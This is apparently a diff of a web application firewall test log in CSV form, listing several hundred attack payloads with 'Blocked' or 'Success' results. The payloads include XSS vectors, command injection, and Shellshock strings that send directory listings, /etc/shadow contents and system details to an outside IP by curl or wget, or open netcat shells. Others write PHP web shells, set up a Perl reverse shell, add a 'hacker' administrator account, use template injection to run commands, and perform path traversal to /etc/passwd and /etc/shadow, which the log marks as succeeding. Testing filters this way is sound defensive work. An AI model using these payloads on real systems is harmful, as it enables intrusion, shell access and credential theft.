+Blocked,"<div id=""28"">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[""'`-->]]>]</div>",403,3662
+Blocked,"<![><img src=""]><img src=x onerror=alert(39)//"">",403,3662
+Blocked,"<svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""40""><style><img src=""</style><img src=x onerror=alert(40)//"">//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""41""><li style=list-style:url() onerror=alert(41)></li>",403,3662
+Blocked,"<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""42""><head><base href=""javascript://""/></head><body><a href=""/. /,alert(42)//#"">XXX</a></body>//[""'`-->]]>]</div>",403,3662
+Blocked,"<html xmlns=""http://www.w3.org/1999/xhtml"">",403,3662
+Blocked,"<div id=""44""><style>*[{}@import'test.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(test.sct)"">//[""'`-->]]>]</div>",403,3662
+Blocked,"<label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",403,3662
+Blocked,"<x '=""foo""><x foo='><img src=x onerror=alert(62)//'>",403,3662
+Blocked,"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",403,3662
+Blocked,"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""63""><embed src=""javascript:alert(63)""></embed> // O10.10↓, OM10.0↓, GC6↓, FF",403,3662
+Blocked,"<img src=""javascript:alert(2)"">",403,3662
+Blocked,"<image src=""javascript:alert(2)""> // IE6, O10.10↓, OM10.0↓",403,3662
+Blocked,"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",403,3662
+Blocked,"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",403,3662
+Blocked,"    <html:style /><x xlink:href=""javascript:alert(68)"" xlink:type=""simple"">XXX</x>",403,3662
+Blocked,"<div id=""69""><card xmlns=""http://www.wapforum.org/2001/wml""><onevent type=""ontimer""><go href=""javascript:alert(69)""/></onevent><timer value=""1""/></card>//[""'`-->]]>]</div><div id=""70""><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[""'`-->]]>]</div><div id=""71""><// style=x:expression\28alert(71)\29>//[""'`-->]]>]</div><div id=""72""><form><button formaction=""javascript:alert(72)"">X</button>//[""'`-->]]>]</div><div id=""73""><event-source src=""event.php"" onload=""alert(73)"">//[""'`-->]]>]</div><div id=""74""><a href=""javascript:alert(74)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>//[""'`-->]]>]</div><div id=""75""><script<{alert(75)}/></script </>//[""'`-->]]>]</div><div id=""76""><?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>//[""'`-->]]>]</div><div id=""77""><?xml-stylesheet type=""text/css""?><root style=""x:expression(alert(77))""/>//[""'`-->]]>]</div><div id=""78""><?xml-stylesheet type=""text/xsl"" href=""#""?><img xmlns=""x-schema:test.xdr""/>//[""'`-->]]>]</div><div id=""79""><object allowscriptaccess=""always"" data=""test.swf""></object>//[""'`-->]]>]</div><div id=""80""><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[""'`-->]]>]</div><div id=""81""><x xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:actuate=""onLoad"" xlink:href=""javascript:alert(81)"" xlink:type=""simple""/>//[""'`-->]]>]</div><div id=""82""><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>//[""'`-->]]>]</div>",403,3662
+Blocked,"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(87)""><rect width=""1000"" height=""1000"" fill=""white""/></a>",403,3662
+Blocked,"<animation xlink:href=""javascript:alert(88)""/>",403,3662
+Blocked,"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",403,3662
+Blocked,"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",403,3662
+Blocked,"<foreignObject xlink:href=""javascript:alert(88)""/>",403,3662
+Blocked,"<set attributeName=""onmouseover"" to=""alert(89)""/>",403,3662
+Blocked,"<animate attributeName=""onunload"" to=""alert(89)""/>",403,3662
+Blocked,<div style=content:url(test2.svg)></div>,403,3662
+Blocked,"<div style=""background:url(test5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",403,3662
+Blocked,"<? foo=""><script>alert(91)</script>"">",403,3662
+Blocked,"<! foo=""><script>alert(91)</script>"">",403,3662
+Blocked,"</ foo=""><script>alert(91)</script>"">",403,3662
+Blocked,"<? foo=""><x foo='?><script>alert(91)</script>'>"">",403,3662
+Blocked,"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",403,3662
+Blocked,"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",403,3662
+Blocked,"<set attributeName=""xlink:href"" to=""data:image/svg+xml;charset=utf-8;base64,",403,3662
+Blocked,"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",403,3662
+Blocked,"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",403,3662
+Blocked,<script>d.innerHTML+='';</script>,403,3662
+Blocked,"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",403,3662
+Blocked,"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",403,3662
+Blocked,"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",403,3662
+Blocked,"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",403,3662
+Blocked,"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",403,3662
+Blocked,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",403,3662
+Blocked,"<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",403,3662
+Blocked,"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",403,3662
+Blocked,"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",403,3662
+Blocked,"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",403,3662
+Blocked,"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""115""><!--[if]><script>alert(115)</script -->",403,3662
+Blocked,"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""117""><a href=""http://attacker.org"">",403,3662
+Blocked,"    <iframe src=""http://example.org/""></iframe>",403,3662
+Blocked,"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');"">",403,3662
+Blocked,"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",403,3662
+Blocked,"<div id=""119""><iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe>",403,3662
+Blocked,"        window.open('popup.html','spam'+i,'width=50,height=50');",403,3662
+Blocked,"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml""",403,3662
+Blocked,"<body style=""background:gray"">",403,3662
+Blocked,"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",403,3662
+Blocked,"<div id=""122""><iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>//[""'`-->]]>]</div>",403,3662
+Blocked,"<a class=bar href=""http://www.example.org"">www.example.org</a>",403,3662
+Blocked,"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",403,3662
+Blocked,"$(""span.foo"").click(function() {",403,3662
+Blocked,alert('foo');,403,3662
+Blocked,"$(""a.bar"").click(function() {",403,3662
+Blocked,alert('bar');,403,3662
+Blocked,"location=""http://html5sec.org"";",403,3662
+Blocked,"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",403,3662
+Blocked,"<script src=""\\example.com\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",403,3662
+Blocked,"            <iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",403,3662
+Blocked,"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",403,3662
+Blocked,"<handler id=""y"">alert(127)</handler>",403,3662
+Blocked,"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",403,3662
+Blocked,"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",403,3662
+Blocked,%20{${sleep(20)}},403,3662
+Blocked,%20{${sleep(3)}},403,3662
+Blocked,|ls,403,3662
+Blocked,||ls,403,3662
+Blocked,|||ls,403,3662
+Blocked,|echo hello there,403,3662
+Blocked,|- -| ls,403,3662
+Blocked,;ls,403,3662
+Blocked,;;ls,403,3662
+Blocked,;;;ls,403,3662
+Blocked,;echo hello there,403,3662
+Blocked,;- -; ls,403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`ls\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`ls\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",403,3662
+Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",403,3662
+Blocked,$(`cat /etc/passwd`),403,3662
+Blocked,() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,403,3662
+Blocked,$(`dir`),403,3662
+Blocked,| dir C:\,403,3662
+Blocked,; dir C:\,403,3662
+Blocked,| dir C:\Documents and Settings\*,403,3662
+Blocked,; dir C:\Documents and Settings\*,403,3662
+Blocked,| dir C:\Users,403,3662
+Blocked,; dir C:\Users,403,3662
+Blocked,;echo%20'<script>alert(1)</script>',403,3662
+Blocked,echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,403,3662
+Blocked,"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",403,3662
+Blocked,"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",403,3662
+Blocked,"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",403,3662
+Blocked,"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
+Blocked,"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
+Blocked,"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
+Blocked,"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",403,3662
+Blocked,"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",403,3662
+Blocked,"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
+Blocked,"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
+Blocked,"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
+Blocked,"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
+Blocked,;echo '<script>alert(1)</script>',403,3662
+Blocked,echo '<script>alert(1)</script>'// XXXXXXXXXXX,403,3662
+Blocked,echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,403,3662
+Blocked,"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",403,3662
+Blocked,"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",403,3662
+Blocked,() { :;}; echo vulnerable 10,403,3662
+Blocked,eval('ls'),403,3662
+Blocked,eval('pwd'),403,3662
+Blocked,eval('pwd');,403,3662
+Blocked,eval('sleep 5'),403,3662
+Blocked,eval('sleep 5');,403,3662
+Blocked,eval('ls'),403,3662
+Blocked,eval('ls');,403,3662
+Blocked,| ifconfig,403,3662
+Blocked,; ifconfig,403,3662
+Blocked,| ipconfig /all,403,3662
+Blocked,; ipconfig /all,403,3662
+Blocked,$(`ls`),403,3662
+Blocked,| ls -l /,403,3662
+Blocked,; ls -l /,403,3662
+Blocked,| ls -laR /etc,403,3662
+Blocked,; ls -laR /etc,403,3662
+Blocked,| ls -laR /var/www,403,3662
+Blocked,; ls -laR /var/www,403,3662
+Blocked,| ls -l /etc/,403,3662
+Blocked,; ls -l /etc/,403,3662
+Blocked,| ls -l /home/*,403,3662
+Blocked,; ls -l /home/*,403,3662
+Blocked,*; ls -lhtR /var/www/,403,3662
+Blocked,| ls -l /tmp,403,3662
+Blocked,; ls -l /tmp,403,3662
+Blocked,| ls -l /var/www/*,403,3662
+Blocked,; ls -l /var/www/*,403,3662
+Blocked,\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`ls\`,403,3662
+Blocked,\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`ls\`,403,3662
+Blocked,| net localgroup Administrators hacker /ADD,403,3662
+Blocked,; net localgroup Administrators hacker /ADD,403,3662
+Blocked,& net localgroup Administrators hacker /ADD,403,3662
+Blocked,&& net localgroup Administrators hacker /ADD,403,3662
+Blocked,net localgroup Administrators hacker /ADD,403,3662
+Blocked,;netstat -a;,403,3662
+Blocked,| netstat -an,403,3662
+Blocked,; netstat -an,403,3662
+Blocked,"perl -e 'print ""X""x1024'",403,3662
+Blocked,"|| perl -e 'print ""X""x16096'",403,3662
+Blocked,"| perl -e 'print ""X""x16096'",403,3662
+Blocked,"; perl -e 'print ""X""x16096'",403,3662
+Blocked,"& perl -e 'print ""X""x16096'",403,3662
+Blocked,"&& perl -e 'print ""X""x16096'",403,3662
+Blocked,"perl -e 'print ""X""x16384'",403,3662
+Blocked,"; perl -e 'print ""X""x2048'",403,3662
+Blocked,"& perl -e 'print ""X""x2048'",403,3662
+Blocked,"&& perl -e 'print ""X""x2048'",403,3662
+Blocked,"perl -e 'print ""X""x2048'",403,3662
+Blocked,"|| perl -e 'print ""X""x4096'",403,3662
+Blocked,"| perl -e 'print ""X""x4096'",403,3662
+Blocked,"; perl -e 'print ""X""x4096'",403,3662
+Blocked,"& perl -e 'print ""X""x4096'",403,3662
+Blocked,"&& perl -e 'print ""X""x4096'",403,3662
+Blocked,"perl -e 'print ""X""x4096'",403,3662
+Blocked,"|| perl -e 'print ""X""x8096'",403,3662
+Blocked,"| perl -e 'print ""X""x8096'",403,3662
+Blocked,"; perl -e 'print ""X""x8096'",403,3662
+Blocked,"&& perl -e 'print ""X""x8096'",403,3662
+Blocked,"perl -e 'print ""X""x8192'",403,3662
+Blocked,"perl -e 'print ""X""x81920'",403,3662
+Blocked,`ping 127.0.0.1`,403,3662
+Blocked,| pwd,403,3662
+Blocked,; pwd,403,3662
+Blocked,| sleep 1,403,3662
+Blocked,|| sleep 10,403,3662
+Blocked,| sleep 10,403,3662
+Blocked,{${sleep(10)}},403,3662
+Blocked,|| sleep 15,403,3662
+Blocked,| sleep 15,403,3662
+Blocked, {${sleep(20)}},403,3662
+Blocked,{${sleep(20)}},403,3662
+Blocked, {${sleep(3)}},403,3662
+Blocked,{${sleep(3)}},403,3662
+Blocked,| sleep 5,403,3662
+Blocked, {${sleep(hexdec(dechex(20)))}} ,403,3662
+Blocked,{${sleep(hexdec(dechex(20)))}} ,403,3662
+Blocked,system('cat C:\boot.ini');,403,3662
+Blocked,| systeminfo,403,3662
+Blocked,; systeminfo,403,3662
+Blocked,test*; ls -lhtR /var/www/,403,3662
+Blocked,"test* || perl -e 'print ""X""x16096'",403,3662
+Blocked,"test* | perl -e 'print ""X""x16096'",403,3662
+Blocked,"test* & perl -e 'print ""X""x16096'",403,3662
+Blocked,"test* && perl -e 'print ""X""x16096'",403,3662
+Blocked,"test*; perl -e 'print ""X""x16096'",403,3662
+Blocked,$(`type C:\boot.ini`),403,3662
+Blocked,&&type C:\\boot.ini,403,3662
+Blocked,"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",403,3662
+Blocked,() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,403,3662
+Blocked,| ls,403,3662
+Blocked,; ls,403,3662
+Blocked,' || ls,403,3662
+Blocked,'; ls,403,3662
+Blocked,""" || ls",403,3662
+Blocked,""" | ls",403,3662
+Blocked,"""; ls",403,3662
+Blocked,$(`ls`),403,3662
+Blocked,"{{ get_user_file(""C:\boot.ini"") }}",403,3662
+Blocked,"{{[].__class__.__mro__[1].__subclasses__()[230]('id',stdout=-1).communicate()}}",403,3662
+Success,../../../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../../../etc/passwd%00,200,10701
+Success,../../../../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../../../../etc/passwd%00,200,10701
+Success,../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../etc/passwd%25%30%30,200,10701
+Success,../../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../../etc/passwd%25%30%30,200,10701
+Success,../../../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../../../etc/passwd%25%30%30,200,10701
+Success,../../../../../../../../../../../etc/passwd,200,10701
+Success,../../../../../../../../../../../etc/passwd%25%30%30,200,10701
+Success,../../../../../../../etc/shadow,200,10701
+Success,../../../../../../../etc/shadow%25%30%30,200,10701
+Success,../../../../../../../../etc/shadow,200,10701
+Success,../../../../../../../../etc/shadow%25%30%30,200,10701
+Success,../../../../../../../../../etc/shadow,200,10701
+Success,../../../../../../../../../etc/shadow%25%30%30,200,10701
+Success,../../../../../../../../../../etc/shadow,200,10701
+Success,../../../../../../../../../../etc/shadow%25%30%30,200,10701
+Success,../../../../../../../../../../../etc/shadow,200,10701
+Success,../../../../../../../../../../../etc/shadow%25%30%30,200,10701
+Success,%2Fetc%2Fpasswd,200,10701
+Success,%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00,200,10701
+Success,%2Fetc%2Fshadow,200,10701
+Success,%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
+Success,%2E%2E%2F%2E%2E%2Fetc%2Fshadow%00,200,10701
+Success,%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow,200,10701
